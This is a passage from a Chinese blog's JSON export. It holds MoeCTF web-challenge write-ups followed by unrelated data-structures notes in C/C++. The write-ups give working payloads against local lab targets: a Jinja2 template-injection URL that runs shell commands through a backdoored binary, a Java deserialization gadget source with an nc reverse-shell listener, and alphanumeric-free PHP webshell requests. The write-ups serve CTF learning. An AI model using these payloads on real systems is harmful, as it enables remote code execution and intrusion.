加载了一个字符串，并把它放到了 %rdi 寄存器里。这个地址 0x2004 正是我们之前在 .rodata 区看到的 --HDdss 字符串的起始位置。 1185: e8 a6 fe ff ff call 1030 &lt;strcmp@plt&gt; 118a: 85 c0 test %eax,%eax 118c: 75 3e jne 11cc &lt;main+0x83&gt; 程序调用 strcmp 来比较输入的参数（在 %rsi）和隐藏的密码 --HDdss（在 %rdi）。如果两个字符串不相等(jne)，程序就会直接跳到后面，什么也不做。 11be: 48 8b 00 mov (%rax),%rax 11c1: 48 89 d6 mov %rdx,%rsi 11c4: 48 89 c7 mov %rax,%rdi 11c7: e8 74 fe ff ff call 1040 &lt;execvp@plt&gt; 程序把输入的第二个参数作为要执行的命令，把输入的第三个参数作为命令的参数，然后调用 execvp 来执行！ 这个伪装的 rev 程序是一个通用的提权工具，它的用法是： /usr/bin/rev [密码] [要执行的命令] [命令的参数] 密码：就是我们找到的 --HDdss。 要执行的命令：可以指定任何我们想执行的命令，比如 /bin/cat。 命令的参数：就是 /flag！ http:&#x2F;&#x2F;127.0.0.1:51925&#x2F;?username&#x3D;&#123;&#123; url_for.__globals__.__builtins__.__import__(&#39;os&#39;).makedirs(&#39;static&#39;, exist_ok&#x3D;True) or url_for.__globals__.__builtins__.__import__(&#39;builtins&#39;).open(&#39;static&#x2F;final_flag.txt&#39;,&#39;w&#39;).write( url_for.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;&#x2F;usr&#x2F;bin&#x2F;rev --HDdss &#x2F;bin&#x2F;cat &#x2F;flag&#39;).read() ) &#125;&#125;&amp;password&#x3D;1 http:&#x2F;&#x2F;127.0.0.1:51925&#x2F;static&#x2F;final_flag.txt moectf&#123;8c20281d-8245-18ad-8dae-fe437a5ccd77&#125; 23 第二十三章 幻境迷心·皇陨星沉(大结局) 两个环境解释： 题目在容器dog-app(环境里只有sh,反弹shell时建议使用nc) rev-shel(堡垒机)请使用ssh（root:root123）登录, 可以做反弹shell（请用nc）或外带数据的服务端 (两容器完全共享同一个网卡，相互访问ip都是127.0.0.1，但端口不要冲突) 省流：题目环境使用openjdk8 jar xf demo.jar package com.example.demo.Dog; import java.io.Serializable; import java.util.Objects; public class Dog implements Serializable, DogModel &#123; private int id; private String name; private String breed; private int age; private int hunger; Object object; String methodName; Class[] paramTypes; Object[] args; public Dog(int id, String name, String breed, int age) &#123; this.id = id; this.name = name; this.breed = breed; this.age = age; this.hunger = 50; &#125; public int getId() &#123; return this.id; &#125; public void setId(int id) &#123; this.id = id; &#125; public String getName() &#123; return this.name; &#125; public String getBreed() &#123; return this.breed; &#125; public int getAge() &#123; return this.age; &#125; public int getHunger() &#123; return this.hunger; &#125; public void feed() &#123; this.hunger = Math.max(0, this.hunger - 10); &#125; public boolean equals(Object o) &#123; if (this == o) &#123; return true; &#125; else if (o != null &amp;&amp; this.getClass() == o.getClass()) &#123; Dog dog = (Dog)o; return this.id == dog.id; &#125; else &#123; return false; &#125; &#125; public int hashCode() &#123; this.wagTail(this.object, this.methodName, this.paramTypes, this.args); return Objects.hash(new Object[]&#123;this.id&#125;); &#125; &#125; package com.example.demo.controller; import com.example.demo.Dog.Dog; import com.example.demo.Dog.DogService; import java.util.List; import org.springframework.web.bind.annotation.DeleteMapping; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; @RestController @RequestMapping(&#123;\"/dogs\"&#125;) public class DogController &#123; private final DogService dogService; public DogController(DogService dogService) &#123; this.dogService = dogService; &#125; @GetMapping public List&lt;Dog> getAllDogs() &#123; return this.dogService.getAllDogs(); &#125; @PostMapping public Dog addDog(@RequestParam String name, @RequestParam String breed, @RequestParam int age) &#123; return this.dogService.addDog(name, breed, age); &#125; @PostMapping(&#123;\"/&#123;id&#125;/feed\"&#125;) public Dog feedDog(@PathVariable int id) &#123; return this.dogService.feedDog(id); &#125; @DeleteMapping(&#123;\"/&#123;id&#125;\"&#125;) public Dog removeDog(@PathVariable int id) &#123; return this.dogService.removeDog(id); &#125; @GetMapping(&#123;\"/export\"&#125;) public String exportDogs() &#123; return this.dogService.exportDogsBase64(); &#125; @PostMapping(&#123;\"/import\"&#125;) public String importDogs(@RequestParam(\"data\") String base64Data) &#123; this.dogService.importDogsBase64(base64Data); return \"导入成功！\"; &#125; &#125; package com.example.demo.Dog; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; import java.util.ArrayList; import java.util.Base64; import java.util.Collection; import java.util.HashMap; import java.util.Iterator; import java.util.List; import java.util.Map; import org.springframework.stereotype.Service; @Service public class DogService implements Serializable &#123; private Map&lt;Integer, Dog> dogs = new HashMap(); private int nextId = 1; public DogService() &#123; &#125; public List&lt;Dog> getAllDogs() &#123; return new ArrayList(this.dogs.values()); &#125; public Dog addDog(String name, String breed, int age) &#123; Dog dog = new Dog(this.nextId++, name, breed, age); this.dogs.put(dog.getId(), dog); return dog; &#125; public Dog feedDog(int id) &#123; Dog dog = (Dog)this.dogs.get(id); if (dog != null) &#123; dog.feed(); &#125; return dog; &#125; public Dog removeDog(int id) &#123; return (Dog)this.dogs.remove(id); &#125; public Object chainWagTail() &#123; Object input = null; Object result; for(Iterator var2 = this.dogs.values().iterator(); var2.hasNext(); input = result) &#123; Dog dog = (Dog)var2.next(); if (input == null) &#123; input = dog.object; &#125; result = dog.wagTail(input, dog.methodName, dog.paramTypes, dog.args); &#125; return input; &#125; public String exportDogsBase64() &#123; try &#123; ByteArrayOutputStream baos = new ByteArrayOutputStream(); Throwable var2 = null; Object var5; try &#123; ObjectOutputStream oos = new ObjectOutputStream(baos); Throwable var4 = null; try &#123; oos.writeObject(new ArrayList(this.dogs.values())); oos.flush(); var5 = Base64.getEncoder().encodeToString(baos.toByteArray()); &#125; catch (Throwable var30) &#123; var5 = var30; var4 = var30; throw var30; &#125; finally &#123; if (oos != null) &#123; if (var4 != null) &#123; try &#123; oos.close(); &#125; catch (Throwable var29) &#123; var4.addSuppressed(var29); &#125; &#125; else &#123; oos.close(); &#125; &#125; &#125; &#125; catch (Throwable var32) &#123; var2 = var32; throw var32; &#125; finally &#123; if (baos != null) &#123; if (var2 != null) &#123; try &#123; baos.close(); &#125; catch (Throwable var28) &#123; var2.addSuppressed(var28); &#125; &#125; else &#123; baos.close(); &#125; &#125; &#125; return (String)var5; &#125; catch (IOException var34) &#123; var34.printStackTrace(); return \"\"; &#125; &#125; public void importDogsBase64(String base64Data) &#123; try &#123; ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64Data)); Throwable var3 = null; try &#123; ObjectInputStream ois = new ObjectInputStream(bais); Throwable var5 = null; try &#123; Collection&lt;Dog> imported = (Collection)ois.readObject(); Iterator var7 = imported.iterator(); while(var7.hasNext()) &#123; Dog dog = (Dog)var7.next(); dog.setId(this.nextId++); this.dogs.put(dog.getId(), dog); &#125; &#125; catch (Throwable var32) &#123; var5 = var32; throw var32; &#125; finally &#123; if (ois != null) &#123; if (var5 != null) &#123; try &#123; ois.close(); &#125; catch (Throwable var31) &#123; var5.addSuppressed(var31); &#125; &#125; else &#123; ois.close(); &#125; &#125; &#125; &#125; catch (Throwable var34) &#123; var3 = var34; throw var34; &#125; finally &#123; if (bais != null) &#123; if (var3 != null) &#123; try &#123; bais.close(); &#125; catch (Throwable var30) &#123; var3.addSuppressed(var30); &#125; &#125; else &#123; bais.close(); &#125; &#125; &#125; &#125; catch (ClassNotFoundException | IOException var36) &#123; var36.printStackTrace(); &#125; &#125; &#125; package com.example.demo.Dog; import java.lang.reflect.Method; public interface DogModel &#123; int getId(); void setId(int var1); String getName(); String getBreed(); int getAge(); void feed(); default Object wagTail(Object input, String methodName, Class[] paramTypes, Object[] args) &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(methodName, paramTypes); return method.invoke(input, args); &#125; catch (Exception var7) &#123; var7.printStackTrace(); return null; &#125; &#125; &#125; payload没整出来… ssh root@127.0.0.1 -p 63886 # 密码是root123 nc -lvnp 8888 $payload='' Invoke-WebRequest -Uri 'http://127.0.0.1:63899/dogs/import' -Method Post -Body @&#123; data = $payload &#125; -ContentType 'application/x-www-form-urlencoded' Moe笑传之猜猜爆 一个简单的…猜数字小游戏？猜错了是不会爆炸的！ 直接猜不太现实，我们根据参数和源代码构建JS脚本。 fetch('/flag', &#123; method: 'POST' &#125;) .then(res => res.json()) .then(data => console.log(\"FLAG:\", data.flag)); moectf&#123;843f9f72-a76b-e401-de07-67020ac10438&#125; 摸金偶遇FLAG，拼尽全力难战胜 你正打着《三〇洲》，刚开一个电脑，但是电脑里显示的内容似乎有点不对劲？ 你说得对，但瓦转洲真废了。 短时间内完成不太现实，我们根据参数和源代码构建JS脚本。 const originalFetch = window.fetch; window.fetch = async (url, options) => &#123; if (url.includes(\"/get_challenge\")) &#123; const response = await originalFetch(url, options); const data = await response.clone().json(); const verifyResponse = await originalFetch(\"/verify\", &#123; method: \"POST\", headers: &#123; \"Content-Type\": \"application/json\" &#125;, body: JSON.stringify(&#123; answers: data.numbers, token: data.token &#125;) &#125;); const verifyData = await verifyResponse.json(); if (verifyData.correct) &#123; alert(\"FLAG: \" + verifyData.flag); &#125; return response; &#125; return originalFetch(url, options); &#125;; document.querySelector(\"#decipherComputerChallengeStartBTN\").click(); moectf&#123;e56ad1de-0562-9a9a-213f-8da4bd1ad497&#125; 这是…Webshell？ 这也不让，那也不让，这我咋做？ 一些不包含数字和字母的webshell | 离别歌 原理参考上文，用hackbar发送请求： http:&#x2F;&#x2F;127.0.0.1:14333&#x2F;?shell&#x3D;$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;); $__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); $___&#x3D;$$__;$_($___[_]); value:_&#x3D;phpinfo(); moectf&#123;6f88c899-f037-947f-4432-0607658c9b2b&#125; 这是…Webshell?_revenge 这下彻底没得做了…吧？ 无字母数字webshell之提高篇 | 离别歌 原理参考上文，用burpsuite抓包并发送请求： POST &#x2F;?shell&#x3D;?&gt;&lt;?&#x3D;&#96;.+&#x2F;%3f%3f%3f&#x2F;%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]&#96;%3b?&gt; HTTP&#x2F;1.1 Host: 127.0.0.1:50230 sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;139&quot;, &quot;Not;A&#x3D;Brand&quot;;v&#x3D;&quot;99&quot; sec-ch-ua-mobile: ?0 sec-ch-ua-platform: &quot;Windows&quot; Accept-Language: zh-CN,zh;q&#x3D;0.9 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;139.0.0.0 Safari&#x2F;537.36 Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryTraeCTF Accept-Encoding: gzip, deflate, br Connection: close Content-Length: 165 ------WebKitFormBoundaryTraeCTF Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.txt&quot; Content-Type: text&#x2F;plain env ------WebKitFormBoundaryTraeCTF-- moectf&#123;97583404-f843-e747-6744-e9bc4ff6c536&#125;","categories":[{"name":"笔记","slug":"笔记","permalink":"https://saintcen.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://saintcen.github.io/tags/CTF/"}]},{"title":"数据结构（C语言版）","slug":"数据结构（C语言版）","date":"2025-09-25T16:00:00.000Z","updated":"2025-09-25T11:16:27.132Z","comments":true,"path":"2025/09/26/数据结构（C语言版）/","permalink":"https://saintcen.github.io/2025/09/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88C%E8%AF%AD%E8%A8%80%E7%89%88%EF%BC%89/","excerpt":"","text":"Data Structure 线性表 顺序表 #define MAXSIZE 100 typedef int ElemType; typedef struct &#123; ElemType *elem; int length; &#125; Sqlist; &#x2F;&#x2F;初始化 void InitList(Sqlist &amp;L) &#123; L.elem &#x3D; new ElemType[MAXSIZE]; if (!L.elem) return; L.length &#x3D; 0; &#125; &#x2F;&#x2F;取值 void GetElem(Sqlist L, int i, ElemType &amp;e) &#123; if (i &lt; 1 || i &gt; L.length) return; e &#x3D; L.elem[i - 1]; &#125; &#x2F;&#x2F;定位 int LocateElem(Sqlist L, ElemType e) &#123; for (int i &#x3D; 0; i &lt; L.length; i++) &#123; if (L.elem[i] &#x3D;&#x3D; e) return i + 1; &#125; return 0; &#125; &#x2F;&#x2F;插入 void InsertElem(Sqlist &amp;L, int i, ElemType e) &#123; if (i &lt; 1 || i &gt; L.length + 1) return; if (L.length &#x3D;&#x3D; MAXSIZE) return; for (int j &#x3D; L.length - 1; j &gt;&#x3D; i - 1; j--) &#123; L.elem[j + 1] &#x3D; L.elem[j]; &#125; L.elem[i - 1] &#x3D; e; L.length++; &#125; &#x2F;&#x2F;删除 void DeleteElem(Sqlist &amp;L, int i) &#123; if (i &lt; 1 || i &gt; L.length) return; for (int j &#x3D; i; j &lt; L.length; j++) &#123; L.elem[j - 1] &#x3D; L.elem[j]; &#125; L.length--; &#125; 单链表 #include&lt;iostream&gt; using namespace std; typedef int ElemType; typedef struct Node &#123; ElemType data; struct Node* next; &#125;Node,*LinkList; &#x2F;&#x2F; 初始化(带头结点) void InitList(LinkList &amp;L) &#123; L &#x3D; (Node*)malloc(sizeof(Node)); L-&gt;next &#x3D; NULL; &#x2F;&#x2F;若不带头结点，直接L &#x3D; NULL; &#125; &#x2F;&#x2F; 求表长 int Length(LinkList L)&#123; int len &#x3D; 0; Node *p &#x3D; L; while(p-&gt;next!&#x3D;NULL)&#123; p &#x3D; p-&gt;next; len++; &#125; return len; &#125; &#x2F;&#x2F; 取值 void GetElem(LinkList L, int i, ElemType &amp;e) &#123; Node* p &#x3D; L; int j &#x3D; 0; while (p &amp;&amp; j &lt; i) &#123; p &#x3D; p-&gt;next; j++; &#125; if (!p || j &gt; i) return; e &#x3D; p-&gt;data; &#125; &#x2F;&#x2F; 查找 Node* LocateNode(LinkList L, ElemType e) &#123; Node* p &#x3D; L-&gt;next; while (p &amp;&amp; p-&gt;data !&#x3D; e) &#123; p &#x3D; p-&gt;next; &#125; return p; &#125; &#x2F;&#x2F;插入 void insertNode(LinkList &amp;L, int i, ElemType e) &#123; Node* p &#x3D; L; int j &#x3D; 0; while (p &amp;&amp; j &lt; i - 1) &#123; p &#x3D; p-&gt;next; j++; &#125; if (!p) return; Node* s &#x3D; new Node; s-&gt;data &#x3D; e; s-&gt;next &#x3D; p-&gt;next; p-&gt;next &#x3D; s; &#125; &#x2F;&#x2F;删除 void deleteNode(LinkList &amp;L, int i) &#123; Node* p &#x3D; L; int j &#x3D; 0; while (p &amp;&amp; j &lt; i - 1) &#123; p &#x3D; p-&gt;next; j++; &#125; if (!p-&gt;next||!p) return; Node* q &#x3D; p-&gt;next; p-&gt;next &#x3D; q-&gt;next; delete q; &#125; &#x2F;&#x2F;头插法 void createList_H(LinkList &amp;L, int n) &#123; L &#x3D; new Node; &#x2F;&#x2F; L固定为头结点 L-&gt;next &#x3D; NULL; for (int i &#x3D; 0; i &lt; n; i++) &#123; Node* p &#x3D; new Node; cin &gt;&gt; p-&gt;data; p-&gt;next &#x3D; L-&gt;next; L-&gt;next &#x3D; p; &#125; &#125; &#x2F;&#x2F;尾插法 void createList_R(Node* &amp;L, int n) &#123; L &#x3D; new Node; &#x2F;&#x2F;L为固定头结点 L-&gt;next &#x3D; NULL; Node* r &#x3D; L; for (int i &#x3D; 0; i &lt; n; i++) &#123; Node* p &#x3D; new Node; cin &gt;&gt; p-&gt;data; p-&gt;next &#x3D; NULL; r-&gt;next &#x3D; p; r &#x3D; p; &#125; &#x2F;&#x2F;循环列表，p-&gt;next &#x3D; L-&gt;next; &#125; &#x2F;&#x2F;遍历 void printlist(LinkList L) &#123; Node *p &#x3D; L; while (p) &#123; printf(&quot;%d &quot;, p-&gt;data); p &#x3D; p-&gt;next; &#125; printf(&quot;\\n&quot;); &#125; 双链表 #include&lt;iostream&gt; using namespace std; typedef int Elemtype; &#x2F;&#x2F; 定义双链表节点 typedef struct DNode &#123; Elemtype data; struct DNode* prior; struct DNode* next; &#125; DNode, *DList; &#x2F;&#x2F; 初始化双链表 DList initList() &#123; DNode* head &#x3D; new DNode(); head-&gt;prior &#x3D; nullptr; head-&gt;next &#x3D; nullptr; return head; &#125; &#x2F;&#x2F; 创建双链表 void createList(DList &amp;L, int n) &#123; DNode* p &#x3D; L; for (int i &#x3D; 0; i &lt; n; i++) &#123; DNode* newNode &#x3D; new DNode; cin &gt;&gt; newNode-&gt;data; newNode-&gt;prior &#x3D; p; newNode-&gt;next &#x3D; nullptr; p-&gt;next &#x3D; newNode; p &#x3D; newNode; &#125; &#x2F;&#x2F;循环链表，newNode-&gt;next &#x3D; L-&gt;next;L-&gt;next-&gt;prior &#x3D; newNode; &#125; &#x2F;&#x2F; 插入操作 void insertNode(DList &amp;L, int pos, Elemtype e) &#123; DNode* p &#x3D; L; int i &#x3D; 0; while (p &amp;&amp; i &lt; pos) &#123; p &#x3D; p-&gt;next; i++; &#125; if (!p) &#123; return; &#125; DNode* newNode &#x3D; new DNode; newNode-&gt;data &#x3D; e; newNode-&gt;next &#x3D; p-&gt;next; newNode-&gt;prior &#x3D; p; if (p-&gt;next) &#123; p-&gt;next-&gt;prior &#x3D; newNode; &#125; p-&gt;next &#x3D; newNode; &#125; &#x2F;&#x2F; 删除操作 void deleteNode(DList &amp;L, int pos) &#123; DNode* p &#x3D; L-&gt;next; int i &#x3D; 0; while (p &amp;&amp; i &lt; pos) &#123; p &#x3D; p-&gt;next; i++; &#125; if (!p) &#123; return; &#125; if (p-&gt;prior) &#123; p-&gt;prior-&gt;next &#x3D; p-&gt;next; &#125; if (p-&gt;next) &#123; p-&gt;next-&gt;prior &#x3D; p-&gt;prior; &#125; delete p; &#125; &#x2F;&#x2F; 正向遍历 void traverseForward(DList L) &#123; DNode* p &#x3D; L-&gt;next; while (p) &#123; cout &lt;&lt; p-&gt;data &lt;&lt; &quot; &quot;; p &#x3D; p-&gt;next; &#125; cout &lt;&lt; endl; &#125; &#x2F;&#x2F; 反向遍历 void traverseBackward(DList L) &#123; DNode* p &#x3D; L; while (p-&gt;next) &#123; p &#x3D; p-&gt;next; &#125; while (p !&#x3D; L) &#123; cout &lt;&lt; p-&gt;data &lt;&lt; &quot; &quot;; p &#x3D; p-&gt;prior; &#125; cout &lt;&lt; endl; &#125; STL list #include &lt;list&gt; #include&lt;iostream&gt; using namespace std; int main()&#123; list&lt;int&gt; l; &#x2F;&#x2F; 插入元素 l.push_back(10); l.push_front(5); &#x2F;&#x2F; 输出 for (int val : l) &#123; cout &lt;&lt; val &lt;&lt; &quot; &quot;; &#125; &#x2F;&#x2F; 查找元素 auto it &#x3D; find(l.begin(), l.end(), 10); if (it !&#x3D; l.end()) &#123; cout &lt;&lt; distance(l.begin(),it) &lt;&lt; endl; &#125; &#x2F;&#x2F; 删除元素 l.erase(l.begin()); &#x2F;&#x2F; 反转链表 l.reverse(); &#x2F;&#x2F; 排序链表 l.sort(); &#x2F;&#x2F; 删除相邻的重复元素 l.push_back(20); l.push_back(20); l.unique(); &#125; 静态链表 typedef int ElemType; #define MAXSIZE 50 typedef struct&#123; ElemType data; int next;&#x2F;&#x2F; 存储地址(具体数值) &#125;SLinkList[MAXSIZE]; 栈与队列 栈 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef int Elemtype; &#x2F;&#x2F;顺序存储 typedef struct &#123; Elemtype *top; Elemtype *base; int size; &#125; SqStack; void Init(SqStack &amp;s) &#123; s.base &#x3D; new Elemtype[MAXSIZE]; s.top &#x3D; s.base; s.size &#x3D; MAXSIZE; &#125; bool IsEmpty(SqStack s) &#123; return s.base &#x3D;&#x3D; s.top; &#125; bool IsFull(SqStack s) &#123; return (s.top - s.base) &#x3D;&#x3D; s.size; &#125; void Push(SqStack &amp;s, Elemtype e) &#123; if (IsFull(s)) &#123; return; &#125; *s.top &#x3D; e; s.top++; &#125; Elemtype Pop(SqStack &amp;s, Elemtype &amp;e) &#123; if (IsEmpty(s)) &#123; return; &#125; s.top--; e &#x3D; *s.top; &#125; void Print(SqStack &amp;s) &#123; if (IsEmpty(s)) &#123; return; &#125; for (Elemtype *p &#x3D; s.base; p !&#x3D; s.top; p++) &#123; cout &lt;&lt; *p &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; &#125; Elemtype GetTop(SqStack s) &#123; if (IsEmpty(s)) &#123; return; &#125; Elemtype e &#x3D; *s.top; return e; &#125; &#x2F;&#x2F; 链式存储 typedef struct Linknode &#123; Elemtype data; struct Linknode *next; &#125; Linknode, *LiStack; void Init(LiStack &amp;s) &#123; s &#x3D; NULL; &#125; void Push(LiStack &amp;s, Elemtype e) &#123; LiStack p &#x3D; new Linknode; p-&gt;data &#x3D; e; p-&gt;next &#x3D; s; s &#x3D; p; &#125; void Pop(LiStack &amp;s, Elemtype &amp;e) &#123; if (s &#x3D;&#x3D; NULL) return; e &#x3D; s-&gt;data; LiStack p &#x3D; s; s &#x3D; s-&gt;next; delete p; &#125; Elemtype GetTop(LiStack s) &#123; if (s !&#x3D; NULL) return s-&gt;data; return -1; &#125; &#x2F;&#x2F; 共享存储 typedef struct &#123; Elemtype *base; Elemtype *top1; Elemtype *top2; int capacity; &#125; SharedStack; STL stack top() 访问栈顶元素（如果栈为空，此处会出错） push(x) 向栈中插入元素 x pop() 删除栈顶元素 size() 查询容器中的元素数量 empty() 询问容器是否为空 #include&lt;stack&gt; using namespace std; int main()&#123; stack&lt;int&gt; s1; s1.push(2); s1.push(1); cout &lt;&lt; s1.size() &lt;&lt; endl; s1.pop(); s1.pop(); cout &lt;&lt; s1.empty() &lt;&lt; endl; &#125; 队列 #include&lt;iostream&gt; using namespace std; #define maxsize 100 typedef int ElemType; typedef struct &#123; ElemType *base; int front; int rear; &#125; SqQueue;&#x2F;&#x2F; 可作为单向队列或循环队列，这里视为循环队列 &#x2F;&#x2F; 初始化 void InitQueue(SqQueue &amp;q) &#123; q.base &#x3D; new ElemType[maxsize]; if (!q.base) &#123; return; &#125; q.front &#x3D; 0; q.rear &#x3D; 0; &#125; &#x2F;&#x2F; 长度 int QueueLength(SqQueue q) &#123; return (q.rear - q.front + maxsize) % maxsize; &#125; &#x2F;&#x2F; 判断是否为空 bool IsEmpty(SqQueue q) &#123; return q.front &#x3D;&#x3D; q.rear; &#125; &#x2F;&#x2F; 判断是否已满 bool IsFull(SqQueue q) &#123; return (q.rear + 1) % maxsize &#x3D;&#x3D; q.front; &#125; &#x2F;&#x2F; 入队 void EnQueue(SqQueue &amp;q, ElemType e) &#123; if (IsFull(q)) &#123; return; &#125; q.base[q.rear] &#x3D; e; q.rear &#x3D; (q.rear + 1) % maxsize; &#125; &#x2F;&#x2F; 出队 void DeQueue(SqQueue &amp;q, ElemType &amp;e) &#123; if (IsEmpty(q)) &#123; return; &#125; e &#x3D; q.base[q.front]; q.front &#x3D; (q.front + 1) % maxsize; &#125; &#x2F;&#x2F; 获取队头元素 ElemType GetHead(SqQueue q) &#123; if (!IsEmpty(q)) &#123; return q.base[q.front]; &#125; return -1; &#125; &#x2F;&#x2F; 打印 void PrintQueue(SqQueue q) &#123; if (IsEmpty(q)) &#123; return; &#125; int i &#x3D; q.front; while (i !&#x3D; q.rear) &#123; cout &lt;&lt; q.base[i] &lt;&lt; &quot; &quot;; i &#x3D; (i + 1) % maxsize; &#125; cout &lt;&lt; endl; &#125; &#x2F;&#x2F; 队列链式存储(带头结点) &#x2F;&#x2F; 节点定义 typedef struct QNode&#123; ElemType data; struct QNode *next; &#125;QNode; &#x2F;&#x2F; 链队列定义 typedef struct &#123; QNode *front; QNode *rear; &#125;LinkQueue; &#x2F;&#x2F; 初始化队列 void InitQueue(LinkQueue &amp;Q) &#123; Q.front &#x3D; new QNode; Q.rear &#x3D; Q.front; Q.front-&gt;next &#x3D; NULL; &#125; &#x2F;&#x2F; 判断为空 bool IsEmpty(LinkQueue Q)&#123; return (Q.front &#x3D;&#x3D; Q.rear); &#125; &#x2F;&#x2F; 入队操作 void EnQueue(LinkQueue &amp;Q, ElemType e) &#123; QNode *newNode &#x3D; new QNode; newNode-&gt;data &#x3D; e; newNode-&gt;next &#x3D; NULL; Q.rear-&gt;next &#x3D; newNode; Q.rear &#x3D; newNode; &#125; &#x2F;&#x2F; 出队操作 void DeQueue(LinkQueue &amp;Q, ElemType &amp;e) &#123; if (IsEmpty(Q)) &#123; return; &#125; QNode *temp &#x3D; Q.front-&gt;next; e &#x3D; temp-&gt;data; Q.front-&gt;next &#x3D; temp-&gt;next; if (temp &#x3D;&#x3D; Q.rear) &#123; Q.rear &#x3D; Q.front; &#125; delete temp; &#125; &#x2F;&#x2F; 获取队头元素 ElemType GetFront(LinkQueue Q) &#123; if (IsEmpty(Q)) &#123; return -1; &#125; return Q.front-&gt;next-&gt;data; &#125; STL queue front() 访问队首元素（如果队列为空，此处会出错） push(x) 向队列中插入元素 x pop() 删除队首元素 size() 查询容器中的元素数量 empty() 询问容器是否为空 deque push_front(x) 在队首插入元素 x push_back(x) 在队尾插入元素 x pop_front() 删除队首元素 pop_back() 删除队尾元素 front() 访问队首元素 back() 访问队尾元素 size() 查询元素数量 empty() 判断是否为空 #include&lt;queue&gt; #include&lt;iostream&gt; using namespace std; int main()&#123; &#x2F;&#x2F; 单向队列 queue&lt;int&gt; q1; q1.push(2); q1.push(1); q1.pop(); cout &lt;&lt; q1.size() &lt;&lt; endl; cout &lt;&lt; q1.front() &lt;&lt; endl; q1.pop(); cout &lt;&lt; q1.empty() &lt;&lt; endl; &#x2F;&#x2F; 双向队列 deque&lt;int&gt; dq; dq.push_back(3); dq.push_front(1); dq.pop_front(); dq.push_front(5); dq.pop_back(); dq.pop_back(); cout &lt;&lt; dq.size() &lt;&lt; endl; cout &lt;&lt; dq.empty() &lt;&lt; endl; &#125; 优先队列(priority_queue) &#x2F;&#x2F; 默认最小堆(原理其实是构建完全二叉树进行堆排序，因此初始化时有数组和比较条件) priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; pq &#x2F;&#x2F; 自定义堆 struct cmp &#123; bool operator()(int a, int b) &#123; return a &lt; b; &#x2F;&#x2F; 最大堆 &#125; &#125;; priority_queue&lt;int, vector&lt;int&gt;, cmp&gt; pq; &#x2F;&#x2F; 插入元素 int element &#x3D; 1; pq.push(element); &#x2F;&#x2F; 访问顶部元素 int top &#x3D; pq.top(); &#x2F;&#x2F; 删除顶部元素 pq.pop(); &#x2F;&#x2F; 检查是否为空 bool isEmpty &#x3D; pq.empty(); &#x2F;&#x2F; 获取元素数量 size_t size &#x3D; pq.size(); 数组 以二维数组为例： LOC(i, j) = LOC(0, 0) + (n * i + j) * L 其中L为每个数组元素所占的单元。 特殊矩阵的压缩存储 1.对称矩阵 对于 n 阶矩阵 A，若ai, j = aj, i，则为对称矩阵。假设我们要压缩成一维数组，求解下标k有以下公式： $$ i&gt;=j,k = \\frac{i(i-1)}{2}+j-1\\\\i&lt;j,k = \\frac{j(j-1)}{2}+i-1\\\\ $$ 2.三角矩阵 $$ 上三角：i&gt;j,k = \\frac{n(n+1)}{2},i&lt;=j,\\frac{(2n-i+2)(i-1)}{2}+j-i\\\\ 下三角：i&gt;j,k = \\frac{i(i-1)}{2}+j-1,i&lt;=j,\\frac{n(n+1)}{2} $$ 3.带状矩阵 第 1 行和第 n 行有两个元，其余行均有三个元，（形成三条对角线），对ai, j若压缩成一维矩阵有： k = 2i + j − 3 4.稀疏矩阵 将稀疏分布的矩阵转为三元组（行标i，列标j，值ai, j） typedef struct&#123; int col; int row; int data; &#125;Matrix; STL vector push_back(x) 在尾部插入元素 x pop_back() 删除尾部元素 front() 访问首元素 back() 访问尾元素 size() 查询元素数量 empty() 判断是否为空 clear() 清空所有元素 #include&lt;vector&gt; #include&lt;iostream&gt; using namespace std; int main()&#123; vector&lt;int&gt; vec; vec.push_back(1); vec.push_back(2); vec.pop_back(); vec.push_back(3); cout &lt;&lt; vec.size() &lt;&lt; endl; cout &lt;&lt; vec.front() &lt;&lt; endl; cout &lt;&lt; vec.back() &lt;&lt; endl; cout &lt;&lt; vec[1] &lt;&lt; endl; vec.clear(); cout &lt;&lt; vec.empty() &lt;&lt; endl; vector&lt;vector&lt;int&gt;&gt; matrix(3, vector&lt;int&gt;(2, 0));&#x2F;&#x2F; 3行，2列，每行填充0 matrix[0][0] &#x3D; 1; matrix[1].push_back(3); vector&lt;int&gt; new_row &#x3D; &#123;5, 7, 9&#125;; matrix.push_back(new_row); for (int i 